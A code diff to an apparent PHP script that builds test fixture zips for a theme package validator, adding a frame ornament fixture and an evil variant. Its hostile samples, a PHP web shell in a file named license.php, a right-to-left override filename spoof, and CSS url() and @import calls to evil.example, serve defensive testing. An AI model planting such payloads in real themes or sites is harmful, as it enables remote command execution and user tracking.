@@ -55,6 +55,15 @@ $put('good-license.zip', array_merge($std('with-license', $css), [['name' => 'LI
 $put('evil-license-control.zip', array_merge($std('evil', $css), [['name' => 'LICENSE.txt', 'data' => "Copyright \x1b[31m2026 \xe2\x80\xae txt.exe", 'method' => 8]]));
 $put('evil-license-name.zip', array_merge($std('evil', $css), [['name' => 'license.php', 'data' => '<?php system($_GET[0]);', 'method' => 8]]));
 
+// ---- ornaments -----------------------------------------------------------------
+$bar = 'linear-gradient(180deg, transparent 2px, #e50832 2px, #e50832 6px, transparent 6px)';
+$put('good-frames.zip', $std('with-frames', str_replace('--ts-bg:', "--ts-frame-tl: $bar;
+  --ts-frame-br: $bar;
+  --ts-panel-radius-tl: 0;
+  --ts-bg:", $css)));
+$put('evil-frames-url.zip', $std('evil', str_replace('--ts-bg:', "--ts-frame-tl: url(http://evil.example/a.png);
+  --ts-bg:", $css)));
+
 // ---- hostile: the stylesheet -----------------------------------------------------
 $put('evil-css-url.zip', $std('evil', "html.dark {\n  --ts-navbar-bg-image: url(http://evil.example/beacon.png);\n  --ts-bg: #000;\n}\n"));
 $put('evil-css-import.zip', $std('evil', "@import url(http://evil.example/x.css);\n" . $css));
